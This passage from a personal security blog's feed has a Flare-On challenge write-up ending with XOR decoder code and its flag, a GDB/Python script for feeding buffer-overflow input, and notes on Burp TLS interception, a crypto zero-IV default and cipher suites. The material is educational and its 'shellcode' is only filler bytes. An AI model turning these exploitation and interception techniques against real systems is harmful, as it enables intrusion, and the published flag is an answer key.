</span><span class="line">  <span class="k">for</span> <span class="p">(</span><span class="kt">int</span> <span class="n">index</span> <span class="p">=</span> <span class="m">0</span><span class="p">;</span> <span class="n">index</span> <span class="p">&lt;</span> <span class="n">encoded</span><span class="p">.</span><span class="n">Length</span><span class="p">;</span> <span class="p">++</span><span class="n">index</span><span class="p">)</span>
</span><span class="line">    <span class="n">str1</span> <span class="p">=</span> <span class="n">str1</span> <span class="p">+</span> <span class="p">(</span><span class="kt">object</span><span class="p">)</span> <span class="p">(</span><span class="kt">char</span><span class="p">)</span> <span class="p">((</span><span class="kt">uint</span><span class="p">)</span> <span class="n">encoded</span><span class="p">[</span><span class="n">index</span><span class="p">]</span> <span class="p">^</span> <span class="p">(</span><span class="kt">uint</span><span class="p">)</span> <span class="n">str2</span><span class="p">[</span><span class="n">index</span> <span class="p">%</span> <span class="n">str2</span><span class="p">.</span><span class="n">Length</span><span class="p">]);</span>
</span><span class="line">  <span class="k">return</span> <span class="n">str1</span><span class="p">;</span>
</span><span class="line"><span class="p">}</span>
</span><span class="line">
</span><span class="line"><span class="k">public</span> <span class="kt">string</span> <span class="nf">decoder4</span><span class="p">(</span><span class="kt">string</span> <span class="n">encoded</span><span class="p">)</span>
</span><span class="line"><span class="p">{</span>
</span><span class="line">  <span class="kt">string</span> <span class="n">str1</span> <span class="p">=</span> <span class="s">&quot;&quot;</span><span class="p">;</span>
</span><span class="line">  <span class="kt">string</span> <span class="n">str2</span> <span class="p">=</span> <span class="k">this</span><span class="p">.</span><span class="n">decoder2</span><span class="p">(</span><span class="s">&quot;\x001B\x0005\x000ES\x001D\x001BI\a\x001C\x0001\x001AS\0\0\fS\x0006\r\b\x001FT\a\a\x0016K&quot;</span><span class="p">);</span>
</span><span class="line">  <span class="k">for</span> <span class="p">(</span><span class="kt">int</span> <span class="n">index</span> <span class="p">=</span> <span class="m">0</span><span class="p">;</span> <span class="n">index</span> <span class="p">&lt;</span> <span class="n">encoded</span><span class="p">.</span><span class="n">Length</span><span class="p">;</span> <span class="p">++</span><span class="n">index</span><span class="p">)</span>
</span><span class="line">    <span class="n">str1</span> <span class="p">=</span> <span class="n">str1</span> <span class="p">+</span> <span class="p">(</span><span class="kt">object</span><span class="p">)</span> <span class="p">(</span><span class="kt">char</span><span class="p">)</span> <span class="p">((</span><span class="kt">uint</span><span class="p">)</span> <span class="n">encoded</span><span class="p">[</span><span class="n">index</span><span class="p">]</span> <span class="p">^</span> <span class="p">(</span><span class="kt">uint</span><span class="p">)</span> <span class="n">str2</span><span class="p">[</span><span class="n">index</span> <span class="p">%</span> <span class="n">str2</span><span class="p">.</span><span class="n">Length</span><span class="p">]);</span>
</span><span class="line">  <span class="k">return</span> <span class="n">str1</span><span class="p">;</span>
</span><span class="line"><span class="p">}</span>
</span></code></pre></td></tr></table></div></figure></notextile></div>

<p>We can either write code or paste it into an online C# compiler. In the end we have the flag:</p>

<div class="bogus-wrapper"><notextile><figure class="code"><figcaption><span>Flag 7 </span></figcaption>
<div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class="line-number">1</span>
</pre></td><td class="code"><pre><code class=""><span class="line">da7.f1are.finish.lin3@flare-on.com</span></code></pre></td></tr></table></div></figure></notextile></div>

<p>And the email:</p>

<div class="bogus-wrapper"><notextile><figure class="code"><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class="line-number">1</span>
<span class="line-number">2</span>
<span class="line-number">3</span>
</pre></td><td class="code"><pre><code class=""><span class="line">Alright, we give in. You've done it. Your reversing-fu is strong.
</span><span class="line">I'll pass your info on to the FLARE team and someone will be in touch.
</span><span class="line">-FLARE</span></code></pre></td></tr></table></div></figure></notextile></div>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[Malware Adventure]]></title>
    <link href="http://parsiya.net/blog/2014-09-21-malware-adventure/"/>
    <updated>2014-09-21T19:11:43-04:00</updated>
    <id>http://parsiya.net/blog/malware-adventure</id>
    <content type="html"><![CDATA[<p>I finally caved in and started to push some of my code to <del>github</del> bitbucket. It is located at <a href="https://bitbucket.org/parsiya">https://bitbucket.org/parsiya</a> and is almost empty ;).</p>

<p>This is Malware Adventure. It’s a small adventure game I wrote using PAWS. PAWS is Pyhton Adventure Writing System by Roger Plowman. Get it from <a href="http://home.fuse.net/wolfonenet/PAWS.htm">http://home.fuse.net/wolfonenet/PAWS.htm</a>. It’s great.</p>

<p>The game itself is a Python program. You define objects which can be be rooms, items etc. You can read more about it in the readme file at <a href="https://bitbucket.org/parsiya/MalwareAdventure">https://bitbucket.org/parsiya/MalwareAdventure</a>.</p>

<p>PS: Yes, I should be working on the Flare-On challenge writeup. It needs more time because I am not only documenting my solution but what other stuff I did. I think failed attempts are as important as the solution in challenge writeups.</p>

<p>PPS: Changed links to <code>bitbucket</code> as I stopped using github.</p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[Fireeye's FLARE Challenge]]></title>
    <link href="http://parsiya.net/blog/2014-09-02-fireeyes-flare-challenge/"/>
    <updated>2014-09-02T00:34:00-04:00</updated>
    <id>http://parsiya.net/blog/fireeyes-flare-challenge</id>
    <content type="html"><![CDATA[<p>It’s been a while. I know I should have updated more frequently but lazyness prevails.<br />
Anyway, I was busy doing Fireeye’s FlARE challenges for a month or so (it was depressing to see people finish in 10 hours :). You can find the challenges at <a href="http://flare-on.com">http://flare-on.com</a>. I learned a lot doing them. They will release solutions in 2 weeks. I am also working on a writeup which I will release then. I think it will be interesting as it will be a n00b’s perspective.</p>

<p>And finally. “Good news everyone!” I am transitioning a more reverse engineering oriented role at my day job. YAY :)</p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[Apple's Common Crypto Library Defaults to a Zero IV if One Is Not Provided]]></title>
    <link href="http://parsiya.net/blog/2014-07-03-apples-common-crypto-library-defaults-to-a-zero-iv-if-one-is-not-provided/"/>
    <updated>2014-07-03T01:30:18-04:00</updated>
    <id>http://parsiya.net/blog/apples-common-crypto-library-defaults-to-a-zero-iv-if-one-is-not-provided</id>
    <content type="html"><![CDATA[<p>Today I was writing some guidelines about generating keys for mobile applications at work. While providing code examples in Java and Obj-C for AES encryption I happened to look at Apple’s <a href="http://opensource.apple.com/source/CommonCrypto/CommonCrypto-60049/lib/">Common Crypto</a> library . While going through the source code for <a href="http://opensource.apple.com/source/CommonCrypto/CommonCrypto-60049/lib/CommonCryptor.c">CommonCryptor.c</a>, I noticed that IV is commented as <code>/* optional initialization vector */</code>. This makes sense because not all ciphers use IV and not all AES modes of operation (e.g. ECB mode). However; if an IV is not provided, the library will default to a zero IV.</p>

<p>You can see the code here inside the function <code>ccInitCryptor</code> (search for defaultIV) <a href="http://opensource.apple.com/source/CommonCrypto/CommonCrypto-60049/lib/CommonCryptor.c">source</a>. <code>CC_XZEROMEM</code> resets all bytes of IV to zero (that is 0x00):</p>

<div class="bogus-wrapper"><notextile><figure class="code"><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class="line-number">1</span>
<span class="line-number">2</span>
<span class="line-number">3</span>
<span class="line-number">4</span>
<span class="line-number">5</span>
<span class="line-number">6</span>
<span class="line-number">7</span>
<span class="line-number">8</span>
<span class="line-number">9</span>
<span class="line-number">10</span>
<span class="line-number">11</span>
<span class="line-number">12</span>
<span class="line-number">13</span>
<span class="line-number">14</span>
<span class="line-number">15</span>
<span class="line-number">16</span>
</pre></td><td class="code"><pre><code class="c"><span class="line"><span class="k">static</span> <span class="kr">inline</span> <span class="n">CCCryptorStatus</span> <span class="nf">ccInitCryptor</span>
</span><span class="line"><span class="p">(</span><span class="n">CCCryptor</span> <span class="o">*</span><span class="n">ref</span><span class="p">,</span> <span class="k">const</span> <span class="kt">void</span> <span class="o">*</span><span class="n">key</span><span class="p">,</span> <span class="kt">unsigned</span> <span class="kt">long</span> <span class="n">key_len</span><span class="p">,</span> <span class="k">const</span> <span class="kt">void</span> <span class="o">*</span><span class="n">tweak_key</span><span class="p">,</span> <span class="k">const</span> <span class="kt">void</span> <span class="o">*</span><span class="n">iv</span><span class="p">)</span> <span class="p">{</span>
</span><span class="line">
</span><span class="line">    <span class="kt">size_t</span> <span class="n">blocksize</span> <span class="o">=</span> <span class="n">ccGetCipherBlockSize</span><span class="p">(</span><span class="n">ref</span><span class="p">);</span>
</span><span class="line">    <span class="kt">uint8_t</span> <span class="n">defaultIV</span><span class="p">[</span><span class="n">blocksize</span><span class="p">];</span>
</span><span class="line">
</span><span class="line">
</span><span class="line">    <span class="k">if</span><span class="p">(</span><span class="n">iv</span> <span class="o">==</span> <span class="nb">NULL</span><span class="p">)</span> <span class="p">{</span>
</span><span class="line">        <span class="n">CC_XZEROMEM</span><span class="p">(</span><span class="n">defaultIV</span><span class="p">,</span> <span class="n">blocksize</span><span class="p">);</span>
</span><span class="line">        <span class="n">iv</span> <span class="o">=</span> <span class="n">defaultIV</span><span class="p">;</span>
</span><span class="line">    <span class="p">}</span>
</span><span class="line">
</span><span class="line">    <span class="p">...</span>
</span><span class="line">
</span><span class="line">    <span class="k">return</span> <span class="n">kCCSuccess</span><span class="p">;</span>
</span><span class="line"><span class="p">}</span>
</span></code></pre></td></tr></table></div></figure></notextile></div>

<p>While I am told this is probably common behavior in crypto libraries, I think it’s dangerous. I ended up putting a comment in code examples warning developers about this behavior. So, heads up ;)</p>

]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[Piping SSL/TLS Traffic From SoapUI to Burp]]></title>
    <link href="http://parsiya.net/blog/2014-06-25-piping-ssl-slash-tls-traffic-from-soapui-through-burp/"/>
    <updated>2014-06-25T22:04:53-04:00</updated>
    <id>http://parsiya.net/blog/piping-ssl-slash-tls-traffic-from-soapui-through-burp</id>
    <content type="html"><![CDATA[<p>Recently I was trying to test a web service. The traffic was over SSL/TLS and everything was fine. As I am better with Burp than SoapUI, I wanted to use Burp as a proxy for SoapUI. This should be an easy matter. Burp will create a custom certificate (signed by its root CA) for each site and effectively Man-in-the-Middle the connection. But this time it was different, I was getting the dreaded <code>Peer not Authenticated</code> error. This meant that SoapUI did not recognize Burp’s custom certificate.</p>

<p>I Googled and found some solutions such as adding Burp’s CA to my certificate store (already done), adding it to SoapUI’s keystore (didn’t work) or using custom versions of SoapUI created for exactly this reason (again didn’t work).</p>

<p>After a suitably long period of weeping and gnashing of teeth I achieved salvation.</p>

<p>Here’s how to do it:</p>

<ol>
  <li>
    <p>Set Burp as proxy for SoapUI.<br />
In SoapUI go to <code>File &gt; Preferences &gt; Proxy Settings</code>.</p>
  </li>
  <li>Modify target address to http from https<br />
    <ul>
      <li>2.a. In SoapUI, modify the <code>Service Endpoint.</code> Change <code>https://example.com</code> to <code>http://example.com</code>.<br />
Or  </li>
      <li>2.b. Modify the WSDL and change <code>wsdl:address location</code> similarly and import it into SoapUI.</li>
    </ul>
  </li>
  <li>
    <p>Edit Burp’s listener and check <code>Force use of SSL</code> under <code>Request Handling.</code><br />
Notice that the <code>Redirect to port</code> input field will be automatically populated with 443. If your service endpoint is using a different port, modify that accordingly.</p>
  </li>
  <li>
    <p>Now you can send requests from SoapUI and intercept them in Burp. Responses will appear in both SoapUI and Burp like any proxied application.</p>
  </li>
  <li>Be sure to remove the <code>Force use of SSL</code> after you are done. Otherwise you will be wondering why gmail is available under http in your browser (like <s>me</s> someone I know).</li>
</ol>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[Pasting Shellcode in GDB Using Python]]></title>
    <link href="http://parsiya.net/blog/2014-05-25-pasting-shellcode-into-gdb-using-python/"/>
    <updated>2014-05-25T18:39:58-04:00</updated>
    <id>http://parsiya.net/blog/pasting-shellcode-into-gdb-using-python</id>
    <content type="html"><![CDATA[<p>A few days ago I was trying to write an exploit for a buffer overflow with GDB. This was a console application and pasting shellcode would mess with it.</p>

<p>There are a few options:</p>

<ul>
  <li>Writing shellcode to a file and then using it as input for GDB.</li>
</ul>

<div class="bogus-wrapper"><notextile><figure class="code"><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class="line-number">1</span>
<span class="line-number">2</span>
<span class="line-number">3</span>
<span class="line-number">4</span>
<span class="line-number">5</span>
<span class="line-number">6</span>
<span class="line-number">7</span>
<span class="line-number">8</span>
<span class="line-number">9</span>
<span class="line-number">10</span>
</pre></td><td class="code"><pre><code class="python"><span class="line"><span class="c"># you can also include GDB commands like setting up breakpoints (e.g. b * 0xDEADBEEF)</span>
</span><span class="line"><span class="c"># remember to include a new line after each command</span>
</span><span class="line"><span class="err">$</span> <span class="n">python</span> <span class="o">-</span><span class="n">c</span> <span class="s">&#39;print &quot;b * 0xDEADBEEF&quot; + &quot;</span><span class="se">\n</span><span class="s">&quot; + &quot;</span><span class="se">\x41</span><span class="s">&quot;*1000 + &quot;</span><span class="se">\n</span><span class="s">&quot;&#39;</span> <span class="o">&gt;</span> <span class="nb">input</span>
</span><span class="line">
</span><span class="line"><span class="c"># $ perl -e for perl</span>
</span><span class="line">
</span><span class="line"><span class="c"># start debugging with GDB</span>
</span><span class="line"><span class="c"># -q (quiet mode): no text at startup</span>
</span><span class="line"><span class="err">$</span> <span class="n">gdb</span> <span class="n">executable1</span> <span class="o">-</span><span class="n">q</span>
</span><span class="line"><span class="p">(</span><span class="n">gdb</span><span class="p">)</span> <span class="n">run</span> <span class="o">&lt;</span> <span class="nb">input</span>
</span></code></pre></td></tr></table></div></figure></notextile></div>

<p>After this you can manually debug in GDB.</p>

<ul>
  <li>Writing a Python script for interactive debugging
When I wrote this, I thought it was a clever idea but then someone told me I could have written a GDB script. However, I have already written this snippet so here it goes.</li>
</ul>

<div class="bogus-wrapper"><notextile><figure class="code"><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class="line-number">1</span>
<span class="line-number">2</span>
<span class="line-number">3</span>
<span class="line-number">4</span>
<span class="line-number">5</span>
<span class="line-number">6</span>
<span class="line-number">7</span>
<span class="line-number">8</span>
<span class="line-number">9</span>
<span class="line-number">10</span>
<span class="line-number">11</span>
<span class="line-number">12</span>
<span class="line-number">13</span>
<span class="line-number">14</span>
<span class="line-number">15</span>
<span class="line-number">16</span>
<span class="line-number">17</span>
<span class="line-number">18</span>
<span class="line-number">19</span>
<span class="line-number">20</span>
<span class="line-number">21</span>
<span class="line-number">22</span>
<span class="line-number">23</span>
<span class="line-number">24</span>
<span class="line-number">25</span>
<span class="line-number">26</span>
<span class="line-number">27</span>
<span class="line-number">28</span>
<span class="line-number">29</span>
<span class="line-number">30</span>
<span class="line-number">31</span>
<span class="line-number">32</span>
<span class="line-number">33</span>
<span class="line-number">34</span>
<span class="line-number">35</span>
<span class="line-number">36</span>
<span class="line-number">37</span>
<span class="line-number">38</span>
<span class="line-number">39</span>
<span class="line-number">40</span>
<span class="line-number">41</span>
<span class="line-number">42</span>
<span class="line-number">43</span>
<span class="line-number">44</span>
<span class="line-number">45</span>
<span class="line-number">46</span>
<span class="line-number">47</span>
<span class="line-number">48</span>
</pre></td><td class="code"><pre><code class="python"><span class="line"><span class="c">#!/usr/bin/python</span>
</span><span class="line">
</span><span class="line"><span class="kn">from</span> <span class="nn">subprocess</span> <span class="kn">import</span> <span class="n">Popen</span> <span class="p">,</span> <span class="n">PIPE</span>
</span><span class="line"><span class="kn">from</span> <span class="nn">time</span> <span class="kn">import</span> <span class="n">sleep</span>
</span><span class="line">
</span><span class="line"><span class="c"># shellcode</span>
</span><span class="line"><span class="n">shellcode</span> <span class="o">=</span> <span class="s">&quot;</span><span class="se">\x41</span><span class="s">&quot;</span> <span class="o">*</span> <span class="mi">1000</span> <span class="o">+</span> <span class="s">&quot;</span><span class="se">\n</span><span class="s">&quot;</span>
</span><span class="line">
</span><span class="line"><span class="c"># opens gdb with parameter executable</span>
</span><span class="line"><span class="c"># you can also manage stdout and stderr here</span>
</span><span class="line"><span class="n">proc</span> <span class="o">=</span> <span class="n">Popen</span><span class="p">(</span> <span class="p">[</span><span class="s">&#39;gdb&#39;</span> <span class="p">,</span> <span class="s">&#39;executable&#39;</span><span class="p">]</span> <span class="p">,</span> <span class="n">bufsize</span><span class="o">=</span><span class="mi">1</span> <span class="p">,</span><span class="n">stdin</span><span class="o">=</span><span class="n">PIPE</span> <span class="p">)</span>
</span><span class="line">
</span><span class="line"><span class="c"># sample breakpoint</span>
</span><span class="line"><span class="c"># notice the new line after each command</span>
</span><span class="line"><span class="n">proc</span><span class="o">.</span><span class="n">stdin</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="s">&#39;b *DEADBEEF</span><span class="se">\n</span><span class="s">&#39;</span><span class="p">)</span>
</span><span class="line">
</span><span class="line"><span class="c"># half a second of sleep after each command</span>
</span><span class="line"><span class="n">sleep</span><span class="p">(</span><span class="mf">0.5</span><span class="p">)</span>
</span><span class="line">
</span><span class="line"><span class="c"># r or run to start debugging the program with GDB</span>
</span><span class="line"><span class="n">proc</span><span class="o">.</span><span class="n">stdin</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="s">&#39;r</span><span class="se">\n</span><span class="s">&#39;</span><span class="p">)</span>
</span><span class="line"><span class="n">sleep</span><span class="p">(</span><span class="mf">0.5</span><span class="p">)</span>
</span><span class="line">
</span><span class="line"><span class="c"># any other commands go here</span>
</span><span class="line">
</span><span class="line"><span class="c"># this is a loop, will get every command and pass it to GDB</span>
</span><span class="line"><span class="c"># &quot;leave&quot; == quit GDB and terminate process</span>
</span><span class="line"><span class="c"># &quot;dump&quot;  == paste shellcode</span>
</span><span class="line"><span class="k">while</span> <span class="bp">True</span><span class="p">:</span>
</span><span class="line">    <span class="n">mycommand</span> <span class="o">=</span> <span class="nb">raw_input</span><span class="p">()</span>
</span><span class="line">    <span class="k">if</span> <span class="p">(</span><span class="n">mycommand</span> <span class="o">==</span> <span class="s">&quot;leave&quot;</span><span class="p">):</span>
</span><span class="line">        <span class="c"># quit gdb</span>
</span><span class="line">        <span class="n">proc</span><span class="o">.</span><span class="n">stdin</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="s">&quot;quit</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">)</span>
</span><span class="line">        <span class="k">break</span>
</span><span class="line">	
</span><span class="line">    <span class="c"># paste shellcode</span>
</span><span class="line">    <span class="k">if</span> <span class="p">(</span><span class="n">mycommand</span> <span class="o">==</span> <span class="s">&quot;dump&quot;</span><span class="p">):</span>
</span><span class="line">        <span class="n">proc</span><span class="o">.</span><span class="n">stdin</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="n">shellcode</span><span class="p">)</span>
</span><span class="line">    <span class="c"># more custom commands go here</span>
</span><span class="line">
</span><span class="line">    <span class="c"># not a custom command? send it as-is</span>
</span><span class="line">    <span class="k">else</span><span class="p">:</span>
</span><span class="line">        <span class="n">mycommand</span> <span class="o">=</span> <span class="n">mycommand</span> <span class="o">+</span> <span class="s">&#39;</span><span class="se">\n</span><span class="s">&#39;</span>
</span><span class="line">        <span class="n">proc</span><span class="o">.</span><span class="n">stdin</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="n">mycommand</span><span class="p">)</span>
</span><span class="line">        <span class="n">sleep</span><span class="p">(</span><span class="mf">0.5</span><span class="p">)</span>
</span><span class="line">
</span><span class="line"><span class="c"># close our pipe	</span>
</span><span class="line"><span class="n">proc</span><span class="o">.</span><span class="n">stdin</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
</span></code></pre></td></tr></table></div></figure></notextile></div>

<p>I think that this code can be modified and become a very simple fuzzer. We have control over stdin and can read stdout and stderr. Change input, record output, rinse and repeat. </p>

<p><code>subprocess</code> is a very powerful module. For example to normally run an application with an argument we can write <code>subprocess.call(['gdb','executable']) .</code></p>

<p>but let’s say we want to run executable with input (containing shellcode):</p>

<div class="bogus-wrapper"><notextile><figure class="code"><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class="line-number">1</span>
<span class="line-number">2</span>
<span class="line-number">3</span>
<span class="line-number">4</span>
<span class="line-number">5</span>
</pre></td><td class="code"><pre><code class="python"><span class="line"><span class="kn">import</span> <span class="nn">subprocess</span>
</span><span class="line">
</span><span class="line"><span class="n">shellcode</span> <span class="o">=</span> <span class="s">&quot;</span><span class="se">\x41</span><span class="s">&quot;</span> <span class="o">*</span> <span class="mi">100</span>
</span><span class="line">
</span><span class="line"><span class="n">subprocess</span><span class="o">.</span><span class="n">call</span><span class="p">(</span> <span class="p">[</span><span class="s">&#39;gdb&#39;</span> <span class="p">,</span> <span class="s">&#39;executable&#39;</span><span class="p">]</span> <span class="p">,</span> <span class="n">shellcode</span><span class="p">)</span>
</span></code></pre></td></tr></table></div></figure></notextile></div>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[Amazon S3 and CSS]]></title>
    <link href="http://parsiya.net/blog/2014-04-22-amazon-s3-and-css/"/>
    <updated>2014-04-22T14:03:32-04:00</updated>
    <id>http://parsiya.net/blog/amazon-s3-and-css</id>
    <content type="html"><![CDATA[<p>After I deployed my blog to Amazon S3, I realized that there was no CSS applied to the pages. In Octopress, the look and feel of website is managed by <code>stylesheets/screen.css</code>. It was fine in <code>rake preview</code> but not on the S3 bucket. I looked around for a few hours to no avail. There was one other person who had the same issue on <a href="http://stackoverflow.com/questions/17138615/discrepency-in-rake-preview-vs-rake-deploy">stackoverflow</a> but no answers. Relevant <a href="https://xkcd.com/979/">xkcd</a>:</p>

<p><img class="center" src="http://imgs.xkcd.com/comics/wisdom_of_the_ancients.png" title="Wisdom of the Ancients" /></p>

<p>I finally found my answer. There are other static websites out there so I removed Octopress from my search terms (facepalm! I got my first MSc. in query expansion). This <a href="http://stackoverflow.com/a/14807743">stackoverflow answer</a> sent me to <a href="http://www.adamwilcox.org/2012/05/04/css-on-amazon-s3/">Adam Wilcox’s website</a> and saved the day. Thanks Adam.</p>

<p>Simple fix, go to Amazon S3 bucket web interface. Find <code>stylesheets/screen.css</code>. Go to metadata tab and change <code>content-type</code> to <code>text/css</code>. This has to be repeated every time <code>screen.css</code> is updated (unless I can find how to do this with <code>S3cmd</code>). Usually this is not the case, when I generate my blog again I can see the following indicating that <code>screen.css</code> is not changed (unless you change the theme?):</p>

<div class="bogus-wrapper"><notextile><figure class="code"><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class="line-number">1</span>
<span class="line-number">2</span>
<span class="line-number">3</span>
<span class="line-number">4</span>
<span class="line-number">5</span>
<span class="line-number">6</span>
</pre></td><td class="code"><pre><code class="bash"><span class="line">root@kali:~/Desktop/octopress# rake generate
</span><span class="line"><span class="c">## Generating Site with Jekyll</span>
</span><span class="line">identical <span class="nb">source</span>/stylesheets/screen.css
</span><span class="line">Configuration from /root/Desktop/octopress/_config.yml
</span><span class="line">Building site: <span class="nb">source</span> -&gt; public
</span><span class="line">Successfully generated site: <span class="nb">source</span> -&gt; public
</span></code></pre></td></tr></table></div></figure></notextile></div>

]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[Now Hosted on Amazon S3]]></title>
    <link href="http://parsiya.net/blog/2014-04-20-now-hosted-on-amazon-s3/"/>
    <updated>2014-04-20T13:20:24-04:00</updated>
    <id>http://parsiya.net/blog/now-hosted-on-amazon-s3</id>
    <content type="html"><![CDATA[<p>I moved my blog from Bluehost to Amazon S3. I have not used Cloudfront yet, I doubt my blog has any visitors to justify that.</p>

<p>It was really easy to redirect everything to <a href="http://www.cryptogangsta.com">cryptogangsta.com</a>. <a href="http://parsiya.net">parsiya.net</a>, <a href="http://www.parsiya.net">www.parsiya.net</a> and <a href="http://www.cryptogangsta.com">www.cryptogangsta.com</a> should all point to cryptogangsta.com.</p>

<p>I have decided (for n-th time) to start updating this blog. Hopefully I will do it this time, I have some ideas to keep this blog running ;).</p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[How Do I TLS Ciphersuite?]]></title>
    <link href="http://parsiya.net/blog/2013-11-17-how-do-i-tls-ciphersuite/"/>
    <updated>2013-11-17T21:20:00-05:00</updated>
    <id>http://parsiya.net/blog/how-do-i-tls-ciphersuite</id>
    <content type="html"><![CDATA[<p>“Should we use RC4 or AES-CBC ?”
This is a legitimate question. Many have heard of the highly publicized attacks against AES-CBC (CRIME, BEAST etc) and lean towards RC4. 
If asked (granted no one asks me), my answer would be: If you can control web servers (not feasible in all situations) and users’ browsers 
(almost impossible), upgrade to TLS 1.2 and go with AES-GCM. However, not many browsers supported these and to be honest, more users trumps loss 
of security in many cases.</p>

<!-- more -->

<p>RC4 was a masterpiece for its time (it still is) but it has extreme biases in its PRNG and attacks are prevalent <a href="http://www.isg.rhul.ac.uk/tls/">[1]</a> and because it only takes a 
seed (with no nonce), if a key is re-used, one can find the XOR of plaintexts by XOR-ing two ciphertexts. 
A recent demonstration of this weakness was in the popular “Whatsapp” application where the same key was used in both directions <a href="https://blog.thijsalkema.de/blog/2013/10/08/piercing-through-whatsapp-s-encryption/" title="Octopress FTW">[2]</a>. Granted 
This was an application design flaw but Whatsapp has quite the security history (google Whatsapp and IMEI).</p>

<p>A few days ago Microsoft released security advisory 2868725 “Recommendation to disable RC4.” 
They found out that less than 4% of their 5 million sample websites only worked with RC4 (although from my personal experience RC4 share is 
probably higher) <a href="http://blogs.technet.com/b/srd/archive/2013/11/12/security-advisory-2868725-recommendation-to-disable-rc4.aspx">[3]</a>.</p>

<p>Major browsers are also starting to support TL2 1.2 and AES-GCM.
Chrome has had TLS 1.2 support for a while (Since Chrome 29) <a href="https://src.chromium.org/viewvc/chrome?revision=203090&amp;view=revision">[4]</a> and Chrome 31 (released a few days ago) has support for AES-GCM <a href="https://src.chromium.org/viewvc/chrome?revision=217716&amp;view=revision">[5]</a>.</p>

<p>Firefox has implemented TLS 1.2. <a href="https://bugzilla.mozilla.org/show_bug.cgi?id=861266">[6]</a> and AES-GCM <a href="https://bugzilla.mozilla.org/show_bug.cgi?id=880543">[7]</a>.</p>

<p>IE 11 turns TLS 1.2 on by default <a href="http://blogs.msdn.com/b/ie/archive/2013/11/12/ie11-automatically-makes-over-40-of-the-web-more-secure-while-making-sure-sites-continue-to-work.aspx (has some good information in between IE propaganda)">[8]</a>.</p>

<p>A day after I wrote the draft of this blog post, Adam Langley (author of patches in links <a href="https://src.chromium.org/viewvc/chrome?revision=203090&amp;view=revision">4</a> and <a href="https://src.chromium.org/viewvc/chrome?revision=217716&amp;view=revision">5</a>) wrote a blogpost named 
“A roster of TLS cipher suites weaknesses” <a href="http://googleonlinesecurity.blogspot.com/2013/11/a-roster-of-tls-cipher-suites-weaknesses.html">[9]</a>. He discusses the strengths and weaknesses of the aforementioned three different ciphersuites 
(RC4, AES-CBC and AES-GCM) on top of Chacha20,Poly1305 (if you do not know why the numbers are not powers of 2, google it :D).</p>

<p>tl;dr: seems like AES-GCM is the flavor of the month. More and more browsers are supporting it, it may be a good time to start moving towards it.</p>

<p>PS: I know, I will get the contact page fixed soon (tm).</p>

]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[Microsoft Bluehat Challenges]]></title>
    <link href="http://parsiya.net/blog/2013-09-29-microsoft-bluehat-challenges/"/>
    <updated>2013-09-29T21:41:00-04:00</updated>
    <id>http://parsiya.net/blog/microsoft-bluehat-challenges</id>
    <content type="html"><![CDATA[<p>Microsoft has released their Bluehat challenges. You answer the challenge,
 send it out and if correct they will send the next level (at least that is 
what they say).</p>

<p>There are three categories: Reverse Engineering, Web and Vulnerabilities.</p>

<p>The first Reverse Engineering challenge was quite easy. But it was level 1 
and I do not expect anti-debugging techniques. Let’s see about the next level.</p>

<p>Anyway, Enjoy. <a href="https://www.microsoft.com/security/msrc/collaboration/bluehatchallenge.aspx">Linkie</a>.</p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[Snow Crash and Malware]]></title>
    <link href="http://parsiya.net/blog/2013-09-23-snow-crash-and-malware/"/>
    <updated>2013-09-23T01:06:00-04:00</updated>
    <id>http://parsiya.net/blog/snow-crash-and-malware</id>
    <content type="html"><![CDATA[<p>So I finished “Snow Crash” and it was quite nice. The concept of linguistic malware was interesting and ahead of its time.
I noticed that the term “Virus” was used correctly in the book as the malware
 was not propagating between people (then it would become a worm).
Although I suspect it was due to the fact that most people (read almost everyone)
 calls any malware a “virus”. Nevertheless, it was a very enjoyable read.</p>

<blockquote>
  <p>Any information system of sufficient complexity will inevitably become
infected with viruses - viruses generated from within itself.</p>

  <p><cite>Neal Stephensen - Snow Crash</cite></p>
</blockquote>

<p><img src="http://www.michaeljohngrist.com/wp-content/uploads/2012/12/nam.jpg" alt="Nam Shub" /></p>

<p>Image taken from <a href="http://www.michaeljohngrist.com/2012/12/why-neal-stephensons-snow-crash-was-half-baked-ahtfi/">here</a>.</p>

<p>In other news, I am up to 4.2 billion cookies per second in <a href="http://orteil.dashnet.org/cookieclicker/">Cookie Clicker</a>.</p>

]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[Update Inc]]></title>
    <link href="http://parsiya.net/blog/2013-09-20-update-inc/"/>
    <updated>2013-09-20T00:19:00-04:00</updated>
    <id>http://parsiya.net/blog/update-inc</id>
    <content type="html"><![CDATA[<p>So, I transferred my domain from my last provider, it has not taken effect yet.
Also, I need to start populating the website with relevant stuff. Hang on, I will be back <strong>soon ™</strong>!</p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[MarkDown and Cookie Clicker]]></title>
    <link href="http://parsiya.net/blog/2013-09-15-markdown-and-cookie-clicker/"/>
    <updated>2013-09-15T18:23:00-04:00</updated>
    <id>http://parsiya.net/blog/markdown-and-cookie-clicker</id>
